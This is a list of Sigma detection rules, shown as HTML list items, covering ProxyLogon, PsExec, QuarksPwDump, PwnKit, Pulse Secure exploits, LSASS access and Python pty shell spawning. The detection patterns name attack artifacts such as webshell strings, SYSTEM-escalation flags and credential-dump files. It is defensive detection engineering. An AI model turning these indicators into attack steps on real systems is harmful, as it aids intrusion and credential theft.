<li><a href="#">title:ProxyLogon MSExchange OabVirtualDirectory id: 550d3350-bb8a-4ff3-9533-2ba533f4a1c0 status: experimental description: Detects specific patterns found after a successful ProxyLogon exploitation in relation to a Commandlet invocation of Set-OabVirtualDirectory references: - author: Florian Roth date: 2021/08/09 logsource: product: windows service: msexchange-management detection: selection_cmdlet: - 'OabVirtualDirectory' - ' -ExternalUrl ' selection_params: - 'eval(request' - '<script' - '"unsafe"};' - 'function Page_Load()' condition: all of selection_cmdlet and selection_params falsepositives: - Unlikely level: critical tags: - attack.t1587.001 - attack.resource_development 
<li><a href="#">title:ProxyLogon Reset Virtual Directories Based On IIS Log id: effee1f6-a932-4297-a81f-acb44064fa3a status: experimental description: When exploiting this vulnerability with CVE-2021-26858, an SSRF attack is used to manipulate virtual directories references: - author: frack113 date: 2021/08/10 logsource: product: windows category: webserver definition: w3c-logging must be enabled detection: selection: cs-method: 'POST' sc-status: 200 cs-uri-stem: '/ecp/DDI/DDIService.svc/SetObject' cs-uri-query|contains|all: - 'schema=Reset' - 'VirtualDirectory' cs-username|endswith: '$' keywords: - 'POST' - '200' - '/ecp/DDI/DDIService.svc/SetObject' - 'schema=Reset' - 'VirtualDirectory' - '$' condition: selection or all of keywords falsepositives: - Unlikely level: critical 
<li><a href="#">title:Ps.exe Renamed SysInternals Tool id: 18da1007-3f26-470f-875d-f77faf1cab31 status: test description: Detects renamed SysInternals tool execution with a binary named ps.exe as used by Dragonfly APT group and documented in TA17-293A report author: Florian Roth references: - date: 2017/10/22 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine: 'ps.exe -accepteula' condition: selection falsepositives: - Renamed SysInternals tool level: high tags: - attack.defense_evasion - attack.g0035 - attack.t1036.003 - car.2013-05-009 
<li><a href="#">title:Psexec Accepteula Condition id: 730fc21b-eaff-474b-ad23-90fd265d4988 status: test description: Detects user accept agreement execution in psexec commandline author: omkar72 references: - date: 2020/10/30 modified: 2022/06/23 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\psexec.exe' CommandLine|contains: 'accepteula' condition: selection fields: - Image - CommandLine falsepositives: - Administrative scripts. level: medium tags: - attack.execution - attack.t1569 - attack.t1021 
<li><a href="#">title:PSExec and WMI Process Creations Block id: 97b9ce1e-c5ab-11ea-87d0-0242ac130003 description: Detects blocking of process creations originating from PSExec and WMI commands status: experimental references: - - author: Bhabesh Raj date: 2020/07/14 modified: 2021/11/13 tags: - attack.execution - attack.lateral_movement - attack.t1047 - attack.t1569.002 logsource: product: windows service: windefend definition: 'Requirements:Enabled Block process creations originating from PSExec and WMI commands from Attack Surface Reduction (GUID: d1e49aac-8f56-4280-b9ba-993a6d77406c)' detection: selection: EventID: 1121 ProcessName|endswith: - '\wmiprvse.exe' - '\psexesvc.exe' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:PsExec Pipes Artifacts id: 9e77ed63-2ecf-4c7b-b09d-640834882028 status: test description: Detecting use PsExec via Pipe Creation/Access to pipes author: Nikita Nazarov, oscd.community references: - date: 2020/05/10 modified: 2021/11/27 logsource: product: windows category: pipe_created definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (), but it is worth verifying. You can also use other repo, e.g. , . How to test detection? You can check powershell script from this site ' detection: selection: PipeName|startswith: - 'psexec' - 'paexec' - 'remcom' - 'csexec' condition: selection falsepositives: - Legitimate Administrator activity level: medium tags: - attack.lateral_movement - attack.t1021.002 
<li><a href="#">title:PsExec Service Start id: 3ede524d-21cc-472d-a3ce-d21b568d8db7 status: test description: Detects a PsExec service start author: Florian Roth date: 2018/03/13 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine: C:\Windows\PSEXESVC.exe condition: selection falsepositives: - Administrative activity level: low tags: - attack.execution - attack.s0029 - attack.t1569.002 
<li><a href="#">title:PsExec Tool Execution id: 259e5a6a-b8d2-4c38-86e2-26c5e651361d related: - id: 42c575ea-e41e-41f1-b248-8093c3e82a28 type: derived status: experimental description: Detects PsExec service installation and execution events (service and Sysmon) author: Thomas Patzke date: 2017/06/12 modified: 2021/09/21 references: - - tags: - attack.execution - attack.t1569.002 - attack.s0029 fields: - EventID - CommandLine - ParentCommandLine - ServiceName - ServiceFileName - TargetFilename - PipeName logsource: category: file_event product: windows detection: selection: TargetFilename|endswith: '\PSEXESVC.exe' condition: selection falsepositives: - Unknown level: low 
<li><a href="#">title:PsExec Tool Execution id: 42c575ea-e41e-41f1-b248-8093c3e82a28 status: experimental description: Detects PsExec service installation and execution events (service and Sysmon) author: Thomas Patzke date: 2017/06/12 modified: 2022/03/21 references: - - tags: - attack.execution - attack.t1569.002 - attack.s0029 fields: - EventID - CommandLine - ParentCommandLine - ServiceName - ServiceFileName - TargetFilename - PipeName logsource: product: windows service: system detection: service_installation: Provider_Name: 'Service Control Manager' EventID: 7045 ServiceName: 'PSEXESVC' ImagePath|endswith: '\PSEXESVC.exe' service_execution: EventID: 7036 ServiceName: 'PSEXESVC' condition: service_installation or service_execution falsepositives: - Unknown level: low 
<li><a href="#">title:PsExec Tool Execution id: f3f3a972-f982-40ad-b63c-bca6afdfad7c related: - id: 42c575ea-e41e-41f1-b248-8093c3e82a28 type: derived status: experimental description: Detects PsExec service installation and execution events (service and Sysmon) author: Thomas Patzke date: 2017/06/12 modified: 2021/09/21 references: - - tags: - attack.execution - attack.t1569.002 - attack.s0029 fields: - EventID - CommandLine - ParentCommandLine - ServiceName - ServiceFileName - TargetFilename - PipeName logsource: category: pipe_created product: windows definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (), but it is worth verifying. You can also use other repo, e.g. , . How to test detection? You can check powershell script from this site ' detection: selection: PipeName: '\PSEXESVC' condition: selection falsepositives: - Unknown level: low 
<li><a href="#">title:PsExec Tool Execution id: fa91cc36-24c9-41ce-b3c8-3bbc3f2f67ba related: - id: 42c575ea-e41e-41f1-b248-8093c3e82a28 type: derived status: experimental description: Detects PsExec service installation and execution events (service and Sysmon) author: Thomas Patzke date: 2017/06/12 modified: 2022/05/27 references: - - tags: - attack.execution - attack.t1569.002 - attack.s0029 fields: - EventID - CommandLine - ParentCommandLine - ServiceName - ServiceFileName - TargetFilename - PipeName logsource: category: process_creation product: windows detection: selection: Image|endswith: '\PSEXESVC.exe' User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' condition: selection falsepositives: - Unknown level: low 
<li><a href="#">title:PsExec/PAExec Escalation to LOCAL SYSTEM id: 8834e2f7-6b4b-4f09-8906-d2276470ee23 status: experimental description: Detects suspicious flags used by PsExec and PAExec to escalate a command line to LOCAL_SYSTEM rights references: - - - author: Florian Roth date: 2021/11/23 logsource: category: process_creation product: windows detection: selection_cmd_to_system: # Escalation to LOCAL_SYSTEM CommandLine|endswith: ' -s cmd.exe' selection_supporting_flags: CommandLine|contains: - 'PsExec' - 'PAExec' - 'accepteula' - 'cmd /c ' condition: selection_supporting_flags and selection_cmd_to_system falsepositives: - Admins that use PsExec or PAExec to escalate to the SYSTEM account for maintenance purposes (rare) level: high tags: - attack.develop_capabilities - attack.t1587.001 
<li><a href="#">title:PsExec/PAExec Flags id: 207b0396-3689-42d9-8399-4222658efc99 status: experimental description: Detects suspicious flags used by PsExec and PAExec but no usual program name in command line references: - - - author: Florian Roth date: 2021/05/22 modified: 2021/11/23 logsource: category: process_creation product: windows detection: selection_flags_1: # Escalation to LOCAL_SYSTEM CommandLine|endswith: - ' -s cmd.exe' - ' -s -i cmd.exe' selection_flags_2: CommandLine|contains|all: # Accepting EULA in commandline - often used in automated attacks - 'accepteula' - ' -u ' - ' -p ' - ' \\' filter: CommandLine|contains: - 'paexec' - 'PsExec' condition: ( selection_flags_1 or selection_flags_2 ) and not filter falsepositives: - Weird admins that rename their tools - Software companies that bundle PsExec/PAExec with their software and rename it, so that it is less embarrassing level: high tags: - attack.develop_capabilities - attack.t1587.001 
<li><a href="#">title:Psr.exe Capture Screenshots id: 2158f96f-43c2-43cb-952a-ab4580f32382 status: test description: The psr.exe captures desktop screenshots and saves them on the local machine author: Beyu Denis, oscd.community references: - - - date: 2019/10/12 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\Psr.exe' CommandLine|contains: '/start' condition: selection falsepositives: - Unknown level: medium tags: - attack.collection - attack.t1113 
<li><a href="#">title:Publicly Accessible RDP Service id: 1fc0809e-06bf-4de3-ad52-25e5263b7623 status: experimental description: Detects connections from routable IPs to an RDP listener - which is indicative of a publicly-accessible RDP service. references: - tags: - attack.t1021.001 author: 'Josh Brower @DefensiveDepth' date: 2020/08/22 modified: 2021/11/14 logsource: product: zeek service: rdp detection: selection: id.orig_h|startswith: - '192.168.' - '10.' - '172.16.' - '172.17.' - '172.18.' - '172.19.' - '172.20.' - '172.21.' - '172.22.' - '172.23.' - '172.24.' - '172.25.' - '172.26.' - '172.27.' - '172.28.' - '172.29.' - '172.30.' - '172.31.' - 'fd' - '2620:83:800f' #approved_rdp: #dst_ip: #- x.x.x.x condition: not selection #and not approved_rdp fields: - id.orig_h - id.resp_h falsepositives: - Although it is recommended to NOT have RDP exposed to the internet, verify that this is a) allowed b) the server has not already been compromised via some brute force or remote exploit since it has been exposed to the internet. Work to secure the server if you are unable to remove it from being exposed to the internet. level: high 
<li><a href="#">title:Pubprn.vbs Proxy Execution id: 1fb76ab8-fa60-4b01-bddd-71e89bf555da description: Detects the use of a Microsoft signed script to execute commands. status: experimental references: - author: frack113 date: 2022/05/28 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - '\pubprn.vbs' - 'script:' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1216.001 
<li><a href="#">title:Pulse Connect Secure RCE Attack CVE-2021-22893 id: 5525edac-f599-4bfd-b926-3fa69860e766 status: stable description: This rule detects exploitation attempts using Pulse Connect Secure(PCS) vulnerability (CVE-2021-22893) author: Sittikorn S date: 2021/06/29 references: - - tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection1: c-uri|contains: - '/dana-na/auth/' - '/dana-ws/' - '/dana-cached/' selection2: c-uri|contains: - '?id=' - '?token=' - 'Secid_canceltoken.cgi' - 'CGI::param' - 'meeting' - 'smb' - 'namedusers' - 'metric' condition: selection1 and selection2 falsepositives: - Vulnerability Scanning level: high 
<li><a href="#">title:Pulse Secure Attack CVE-2019-11510 id: 2dbc10d7-a797-49a8-8776-49efa6442e60 status: test description: Detects CVE-2019-11510 exploitation attempt - URI contains Guacamole author: Florian Roth references: - date: 2019/11/18 modified: 2021/11/27 logsource: category: webserver detection: selection: c-uri: '*?/dana/html5acc/guacamole/*' condition: selection fields: - client_ip - vhost - url - response falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1190 
<li><a href="#">title:PurpleSharp Indicator id: ff23ffbc-3378-435e-992f-0624dcf93ab4 status: experimental description: Detects the execution of the PurpleSharp adversary simulation tool author: Florian Roth date: 2021/06/18 modified: 2022/01/12 references: - logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - xyz123456.exe - PurpleSharp selection2: OriginalFileName: 'PurpleSharp.exe' condition: selection1 or selection2 falsepositives: - Unlikely level: critical tags: - attack.t1587 - attack.resource_development 
<li><a href="#">title:PwnDrp Access id: 2b1ee7e4-89b6-4739-b7bb-b811b6607e5e status: test description: Detects downloads from PwnDrp web servers developed for red team testing and most likely also used for criminal activity author: Florian Roth references: - date: 2020/04/15 modified: 2021/11/27 logsource: category: proxy detection: selection: c-uri|contains: '/pwndrop/' condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Unknown level: critical tags: - attack.command_and_control - attack.t1071.001 - attack.t1102.001 - attack.t1102.003 
<li><a href="#">title:PwnKit Local Privilege Escalation id: 0506a799-698b-43b4-85a1-ac4c84c720e9 status: experimental description: Detects potential PwnKit exploitation CVE-2021-4034 in auth logs author: Sreeman date: 2022/01/26 references: - logsource: product: linux service: auth detection: keyword: - 'pkexec' - 'The value for environment variable XAUTHORITY contains suscipious content' - '[USER=root] [TTY=/dev/pts/0]' condition: all of keyword falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.t1548.001 
<li><a href="#">title:Python Initiated Connection id: bef0bc5a-b9ae-425d-85c6-7b2d705980c6 status: experimental description: Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation author: frack113 references: - - date: 2021/12/10 logsource: category: network_connection product: windows detection: selection: Initiated: 'true' Image|contains: python condition: selection falsepositives: - Legitimate python script level: high tags: - attack.discovery - attack.t1046 
<li><a href="#">title:Python Py2Exe Image Load id: cbb56d62-4060-40f7-9466-d8aaf3123f83 description: Detects the image load of Python Core indicative of a Python script bundled with Py2Exe. status: experimental date: 2020/05/03 modified: 2021/12/05 author: Patrick St. John, OTR (Open Threat Research) tags: - attack.defense_evasion - attack.t1027.002 references: - - logsource: product: windows category: image_load detection: selection: Description: 'Python Core' filter: - Image|contains: - 'Python' # FPs with python38.dll, python.exe etc. - Image|startswith: - 'C:\Program Files\' - 'C:\Program Files (x86)\' condition: selection and not filter fields: - Description falsepositives: - Legit Py2Exe Binaries level: medium 
<li><a href="#">title:Python Spawning Pretty TTY id: c4042d54-110d-45dd-a0e1-05c47822c937 status: experimental description: Detects python spawning a pretty tty author: Nextron Systems date: 2022/06/03 references: - tags: - attack.execution - attack.t1059 logsource: category: process_creation product: linux detection: selection_image: Image|contains: - '/python2.' # python image is always of the form ../python3.10; ../python is just a symlink - '/python3.' selection_cli1: CommandLine|contains|all: - 'import pty' - '.spawn(' selection_cli2: CommandLine|contains: 'from pty import spawn' condition: selection_image and 1 of selection_cli* falsepositives: - Unknown level: high 
<li><a href="#">title:Python Spawning Pretty TTY on Windows id: 480e7e51-e797-47e3-8d72-ebfce65b6d8d status: experimental description: Detects python spawning a pretty tty author: Nextron Systems date: 2022/06/03 references: - tags: - attack.execution - attack.t1059 logsource: category: process_creation product: windows detection: selection_image: Image|endswith: - 'python.exe' # no \ bc of e.g. ipython.exe - 'python3.exe' - 'python2.exe' selection_cli1: CommandLine|contains|all: - 'import pty' - '.spawn(' selection_cli2: CommandLine|contains: 'from pty import spawn' condition: selection_image and 1 of selection_cli* falsepositives: - Unknown level: high 
<li><a href="#">title:Python SQL Exceptions id: 19aefed0-ffd4-47dc-a7fc-f8b1425e84f9 status: stable description: Generic rule for SQL exceptions in Python according to PEP 249 author: Thomas Patzke date: 2017/08/12 modified: 2020/09/01 references: - logsource: category: application product: python detection: keywords: - DataError - IntegrityError - ProgrammingError - OperationalError condition: keywords falsepositives: - Application bugs level: medium tags: - attack.initial_access - attack.t1190 
<li><a href="#">title:QBot Process Creation id: 4fcac6eb-0287-4090-8eea-2602e4c20040 status: stable description: Detects QBot like process executions author: Florian Roth date: 2019/10/01 modified: 2021/01/25 tags: - attack.execution - attack.t1059.005 references: - - logsource: category: process_creation product: windows detection: selection1: ParentImage|endswith: '\WinRAR.exe' Image|endswith: '\wscript.exe' selection2: CommandLine|contains: ' /c ping.exe -n 6 127.0.0.1 & type ' selection3: CommandLine|contains|all: - 'regsvr32.exe' - 'C:\ProgramData' - '.tmp' condition: selection1 or selection2 or selection3 fields: - CommandLine - ParentCommandLine falsepositives: - Unlikely level: critical 
<li><a href="#">title:QuarksPwDump Clearing Access History id: 06724b9a-52fc-11ed-bdc3-0242ac120002 status: experimental description: Detects QuarksPwDump clearing access history in hive author: Florian Roth date: 2017/05/15 modified: 2019/11/13 tags: - attack.credential_access - attack.t1003 # an old one - attack.t1003.002 - attack.defense_evasion level: critical logsource: product: windows service: system detection: selection: EventID: 22 Message|contains: 'C:\\Program Files\\nxlog\\nxlog.exe' HostName|startswith: 'EC2AMAZ' condition: selection falsepositives: - Unknown 
<li><a href="#">title:QuarksPwDump Clearing Access History id: 39f919f3-980b-4e6f-a975-8af7e507ef2b status: test description: Detects QuarksPwDump clearing access history in hive author: Florian Roth date: 2017/05/15 modified: 2022/04/14 logsource: product: windows service: system detection: selection: EventID: 16 Provider_Name: Microsoft-Windows-Kernel-General HiveName|contains: '\AppData\Local\Temp\SAM' HiveName|endswith: '.dmp' condition: selection falsepositives: - Unknown level: critical tags: - attack.credential_access - attack.t1003.002 
<li><a href="#">title:QuarksPwDump Dump File id: 847def9e-924d-4e90-b7c4-5f581395a2b4 status: test description: Detects a dump file written by QuarksPwDump password dumper author: Florian Roth references: - date: 2018/02/10 modified: 2021/11/27 logsource: category: file_event product: windows detection: selection: # Sysmon: File Creation (ID 11) TargetFilename|contains|all: - '\AppData\Local\Temp\SAM-' - '.dmp' condition: selection falsepositives: - Unknown level: critical tags: - attack.credential_access - attack.t1003.002 
<li><a href="#">title:Query Registry id: 970007b7-ce32-49d0-a4a4-fbef016950bd status: test description: Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software. author: Timur Zinniatullin, oscd.community references: - date: 2019/10/21 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_1: Image|endswith: '\reg.exe' CommandLine|contains: - 'query' - 'save' - 'export' selection_2: CommandLine|contains: - 'currentVersion\windows' - 'currentVersion\runServicesOnce' - 'currentVersion\runServices' - 'winlogon\' - 'currentVersion\shellServiceObjectDelayLoad' - 'currentVersion\runOnce' - 'currentVersion\runOnceEx' - 'currentVersion\run' - 'currentVersion\policies\explorer\run' - 'currentcontrolset\services' condition: selection_1 and selection_2 fields: - Image - CommandLine - User - LogonGuid - Hashes - ParentProcessGuid - ParentCommandLine level: low tags: - attack.discovery - attack.t1012 - attack.t1007 
<li><a href="#">title:Query to Ammyy Remote Access Software Domain id: 71ba22cb-8a01-42e2-a6dd-5bf9b547498f status: experimental description: | An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) references: - author: frack113 date: 2022/04/04 logsource: product: windows category: dns_query detection: selection: QueryName|endswith: '.ammyy.com' condition: selection falsepositives: - Unknown level: medium tags: - attack.command_and_control - attack.t1219 
<li><a href="#">title:Query to GoToAssist Remote Access Software Domain id: 7c4cf8e0-1362-48b2-a512-b606d2065d7d status: experimental description: | An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) references: - author: frack113 date: 2022/02/13 logsource: product: windows category: dns_query detection: selection: QueryName|endswith: '.getgo.com' condition: selection falsepositives: - Unknown level: medium 
<li><a href="#">title:Query to LogMeIn Remote Access Software Domain id: ed785237-70fa-46f3-83b6-d264d1dc6eb4 status: experimental description: | An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) references: - author: frack113 date: 2022/02/11 logsource: product: windows category: dns_query detection: selection: QueryName|endswith: '.logmein.com' condition: selection falsepositives: - Unknown level: medium tags: - attack.command_and_control - attack.t1219 
<li><a href="#">title:Query Tor Onion Address id: b55ca2a3-7cff-4dda-8bdd-c7bfa63bf544 status: experimental description: Detects DNS resolution of an .onion address related to Tor routing networks references: - author: frack113 date: 2022/02/20 logsource: product: windows category: dns_query detection: selection: QueryName|contains: '.onion' condition: selection falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1090.003 
<li><a href="#">title:Quick Execution of a Series of Suspicious Commands id: 61ab5496-748e-4818-a92f-de78e20fe7f1 description: Detects multiple suspicious process in a limited timeframe status: experimental references: - author: juju4 date: 2019/01/16 modified: 2021/06/13 tags: - car.2013-04-002 - attack.execution - attack.t1059 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - arp.exe - at.exe - attrib.exe - cscript.exe - dsquery.exe - hostname.exe - ipconfig.exe - mimikatz.exe - nbtstat.exe - net.exe - netsh.exe - nslookup.exe - ping.exe - quser.exe - qwinsta.exe - reg.exe - runas.exe - sc.exe - schtasks.exe - ssh.exe - systeminfo.exe - taskkill.exe - telnet.exe - tracert.exe - wscript.exe - xcopy.exe - pscp.exe - copy.exe - robocopy.exe - certutil.exe - vssadmin.exe - powershell.exe - wevtutil.exe - psexec.exe - bcedit.exe - wbadmin.exe - icacls.exe - diskpart.exe timeframe: 5m condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: low 
<li><a href="#">title:Raccine Uninstall id: a31eeaed-3fd5-478e-a8ba-e62c6b3f9ecc status: experimental description: Detects commands that indicate a Raccine removal from an end system. Raccine is a free ransomware protection tool. references: - tags: - attack.defense_evasion - attack.t1562.001 author: Florian Roth date: 2021/01/21 modified: 2021/07/14 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - 'taskkill ' - 'RaccineSettings.exe' selection2: CommandLine|contains|all: - 'reg.exe' - 'delete' - 'Raccine Tray' selection3: CommandLine|contains|all: - 'schtasks' - '/DELETE' - 'Raccine Rules Updater' condition: 1 of selection* falsepositives: - Legitimate deinstallation by administrative staff level: high 
<li><a href="#">title:Rar Usage with Password and Compression Level id: faa48cae-6b25-4f00-a094-08947fef582f status: experimental description: Detects the use of rar.exe, on the command line, to create an archive with password protection or with a specific compression level. This is pretty indicative of malicious actions. references: - - - author: '@ROxPinTeddy' date: 2020/05/12 modified: 2022/03/16 tags: - attack.collection - attack.t1560.001 logsource: category: process_creation product: windows detection: selection_password: CommandLine|contains: ' -hp' selection_other: CommandLine|contains: - ' -m' - ' a ' condition: selection_password and selection_other falsepositives: - Legitimate use of Winrar command line version - Other command line tools, that use these flags level: high 
<li><a href="#">title:Rare GrantedAccess Flags on LSASS Access id: 678dfc63-fefb-47a5-a04c-26bcf8cc9f65 related: - id: 32d0d3e2-e58d-4d41-926b-18b520b2b32d type: obsoletes status: experimental description: Detects process access to LSASS memory with suspicious access flags 0x410 and 0x01410 (spin-off of similar rule) author: Florian Roth date: 2022/03/13 references: - - - - - tags: - attack.credential_access - attack.t1003.001 - attack.s0002 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: '\lsass.exe' GrantedAccess|endswith: '10' # Absolute paths to programs that cause false positives filter1: SourceImage: - 'C:\WINDOWS\system32\taskmgr.exe' - 'C:\Program Files\Malwarebytes\Anti-Malware\MBAMService.exe' - 'C:\PROGRAMDATA\MALWAREBYTES\MBAMSERVICE\ctlrupdate\mbupdatr.exe' - 'C:\WINDOWS\system32\taskhostw.exe' - 'C:\Users\\*\AppData\Local\Programs\Microsoft VS Code\Code.exe' - 'C:\Program Files\Windows Defender\MsMpEng.exe' - 'C:\Windows\SysWOW64\msiexec.exe' - 'C:\Windows\System32\msiexec.exe' - 'C:\Windows\System32\lsass.exe' - 'C:\WINDOWS\System32\perfmon.exe' # Windows Defender filter2: SourceImage|startswith: 'C:\ProgramData\Microsoft\Windows Defender\' SourceImage|endswith: '\MsMpEng.exe' # Microsoft Gaming Services filter3: SourceImage|startswith: 'C:\Program Files\WindowsApps\' SourceImage|endswith: '\GamingServices.exe' # Process Explorer filter4: SourceImage|endswith: - '\PROCEXP64.EXE' - '\PROCEXP.EXE' # VMware Tools filter5: SourceImage|startswith: 'C:\ProgramData\VMware\VMware Tools\' SourceImage|endswith: '\vmtoolsd.exe' # Antivirus and EDR agents filter6: SourceImage|startswith: - 'C:\Program Files\' - 'C:\Program Files (x86)\' SourceImage|contains: 'Antivirus' filter7: SourceImage: 'C:\WINDOWS\system32\wbem\wmiprvse.exe' filter8: SourceImage: 'C:\Windows\sysWOW64\wbem\wmiprvse.exe' filter_mcafee: SourceImage: 'C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.exe' filter_nextron: SourceImage|startswith: 'C:\Windows\Temp\asgard2-agent\' SourceImage|endswith: - '\thor64.exe' - '\thor.exe' # Generic Filter for 0x1410 filter (caused by so many programs like DropBox updates etc.) filter_generic: SourceImage|startswith: - 'C:\Program Files\' - 'C:\Program Files (x86)\' - 'C:\WINDOWS\system32\' filter_localappdata: SourceImage|contains|all: - 'C:\Users\' - '\AppData\Local\' SourceImage|endswith: - '\Microsoft VS Code\Code.exe' - '\software_reporter_tool.exe' - '\DropboxUpdate.exe' - '\MBAMInstallerService.exe' condition: selection and not 1 of filter* fields: - User - SourceImage - GrantedAccess falsepositives: - Legitimate software accessing LSASS process for legitimate reason level: medium 
<li><a href="#">title:Rare Scheduled Task Creations id: b20f6158-9438-41be-83da-a5a16ac90c2b status: test description: This rule detects rare scheduled task creations. Typically software gets installed on multiple systems and not only on a few. The aggregation and count function selects tasks with rare names. author: Florian Roth date: 2017/03/17 modified: 2021/12/28 logsource: product: windows service: taskscheduler detection: selection: EventID: 106 filter1: TaskName: \Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan timeframe: 7d condition: selection and not 1 of filter* falsepositives: - Software installation level: low tags: - attack.persistence - attack.s0111 - attack.t1053.005 
<li><a href="#">title:Rare Schtasks Creations id: b0d77106-7bb0-41fe-bd94-d1752164d066 status: test description: Detects rare scheduled tasks creations that only appear a few times per time frame and could reveal password dumpers, backdoor installs or other types of malicious code author: Florian Roth date: 2017/03/23 modified: 2021/11/27 logsource: product: windows service: security definition: 'The Advanced Audit Policy setting Object Access > Audit Other Object Access Events has to be configured to allow this detection (not in the baseline recommendations by Microsoft). We also recommend extracting the Command field from the embedded XML in the event data.' detection: selection: EventID: 4698 timeframe: 7d condition: selection falsepositives: - Software installation - Software updates level: low tags: - attack.execution - attack.privilege_escalation - attack.persistence - car.2013-08-001 - attack.t1053.005 
<li><a href="#">title:Rare Service Installations id: 66bfef30-22a5-4fcd-ad44-8d81e60922ae status: test description: Detects rare service installs that only appear a few times per time frame and could reveal password dumpers, backdoor installs or other types of malicious services author: Florian Roth date: 2017/03/08 modified: 2022/03/21 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 timeframe: 7d condition: selection falsepositives: - Software installation - Software updates level: low tags: - attack.persistence - attack.privilege_escalation - car.2013-09-005 - attack.t1543.003 
<li><a href="#">title:Rare Subscription-level Operations In Azure id: c1182e02-49a3-481c-b3de-0fadc4091488 status: test description: Identifies IPs from which users grant access to other users on azure resources and alerts when a previously unseen source IP address is used. author: sawwinnnaung references: - date: 2020/05/07 modified: 2021/11/27 logsource: product: azure service: azureactivity detection: keywords: - Microsoft.DocumentDB/databaseAccounts/listKeys/action - Microsoft.Maps/accounts/listKeys/action - Microsoft.Media/mediaservices/listKeys/action - Microsoft.CognitiveServices/accounts/listKeys/action - Microsoft.Storage/storageAccounts/listKeys/action - Microsoft.Compute/snapshots/write - Microsoft.Network/networkSecurityGroups/write condition: keywords falsepositives: - Valid change level: medium tags: - attack.t1003 
<li><a href="#">title:Raw Disk Access Using Illegitimate Tools id: db809f10-56ce-4420-8c86-d6a7d793c79c description: Raw disk access using illegitimate tools, possible defence evasion author: Teymur Kheirkhabarov, oscd.community status: test date: 2019/10/22 modified: 2022/03/15 references: - tags: - attack.defense_evasion - attack.t1006 logsource: product: windows category: raw_access_thread detection: filter_1: Device|contains: floppy filter_2: Image|startswith: - 'C:\Windows\System32\' - 'C:\Windows\SystemApps\' - 'C:\Windows\WinSxS\' - 'C:\Windows\servicing\' - 'C:\Windows\CCM\' - 'C:\Windows\uus\' - 'C:\Windows\WinSxs\' filter_3: ProcessId: 4 filter_specific: Image: - 'C:\Windows\UUS\amd64\MoUsoCoreWorker.exe' - 'C:\Windows\explorer.exe' filter_system: Image: - 'System' - 'Registry' filter_Keybase: Image|endswith: '\Keybase\upd.exe' filter_windefender: Image|startswith: 'C:\ProgramData\Microsoft\Windows Defender\Platform\' Image|endswith: '\MsMpEng.exe' filter_programfiles: # this rule causes so many FPs that we have to do this Image|startswith: - 'C:\Program Files\' - 'C:\Program Files (x86)\' filter_appdata: Image|contains|all: - 'C:\Users\' - '\AppData\' - '\Microsoft\' filter_nextron: Image|startswith: 'C:\Windows\Temp\asgard2-agent\' Image|endswith: '\thor.exe' filter_startmenu_xphost: Image|startswith: 'C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost' Image|endswith: '\StartMenuExperienceHost.exe' condition: not 1 of filter_* fields: - ComputerName - Image - ProcessID - Device falsepositives: - Legitimate Administrator using tool for raw access or ongoing forensic investigation level: low # far too many false positives 
<li><a href="#">title:Raw Paste Service Access id: 5468045b-4fcc-4d1a-973c-c9c9578edacb status: test description: Detects direct access to raw pastes in different paste services often used by malware in their second stages to download malicious code in encrypted or encoded form author: Florian Roth references: - date: 2019/12/05 modified: 2021/11/27 logsource: category: proxy detection: selection: c-uri|contains: - '.paste.ee/r/' - '.pastebin.com/raw/' - '.hastebin.com/raw/' - '.ghostbin.co/paste/*/raw/' condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - User activity (e.g. developer that shared and copied code snippets and used the raw link instead of just copy & paste) level: high tags: - attack.command_and_control - attack.t1071.001 - attack.t1102.001 - attack.t1102.003 - attack.defense_evasion 
